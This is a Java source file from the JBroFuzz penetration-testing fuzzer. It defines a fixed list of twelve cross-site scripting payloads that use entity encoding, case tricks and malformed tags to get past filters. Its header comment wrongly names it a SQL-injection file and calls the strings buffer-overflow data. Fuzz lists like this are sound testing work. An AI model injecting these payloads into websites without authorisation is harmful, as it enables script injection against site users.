/**
 * DefSqlInjections.java
 *
 * Java Bro Fuzzer. A stateless network protocol fuzzer for penetration tests.
 * It allows for the identification of certain classes of security bugs, by
 * means of creating malformed data and having the network protocol in question
 * consume the data.
 *
 * Copyright (C) 2006 yns000 (at) users. sourceforge. net
 *
 * This program is free software; you can redistribute it and/or
 * modify it under the terms of the GNU General Public License
 * as published by the Free Software Foundation; either version 2
 * of the License, or any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program; if not, write to the Free Software
 * Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,
 * MA  02110-1301, USA.
 */
package jbrofuzz.fuzz.def;

/**
 * <p>Title: Java Browser Fuzzer</p>
 *
 * <p>Description: A simple application for fuzzing URLs</p>
 *
 * @author subere@uncon.org
 * @version 0.2
 */
public class DefXSSInjections {
  public static final int LENGTH = 12;

  private String [] array;

  public DefXSSInjections() {
    String [] array = {
        "<IMG SRC=javascript:alert('XSS')>",
         "<IMG SRC=JaVaScRiPt:alert('XSS')>",
         "<IMG SRC=`javascript:alert(\"XSS says, 'XSS'\")`>",
         "<IMG \"\"\"><SCRIPT>alert(\"XSS\")</SCRIPT>\">",
         "<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>",
         "<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>",
         "<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>",
         "<IMG SRC=\"jav&#x0D;ascript:alert('XSS');\">",
         "perl -e 'print \"<SCR\0IPT>alert(\"XSS\")</SCR\0IPT>\";' > out",
         "<BODY onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert(\"XSS\")>",
         "<<SCRIPT>alert(\"XSS\");//<</SCRIPT>",
         "<IFRAME SRC=\"javascript:alert('XSS');\"></IFRAME>"};
     this.array = array;
  }
  /**
   * <p>Method responsible for returning the buffer overflow string from the
   * instantiated class.</p>
   *
   * @param n int
   * @return String
   */
  public String getXSSElement(int n) {
    n %= LENGTH;
    return array[n];
  }
}
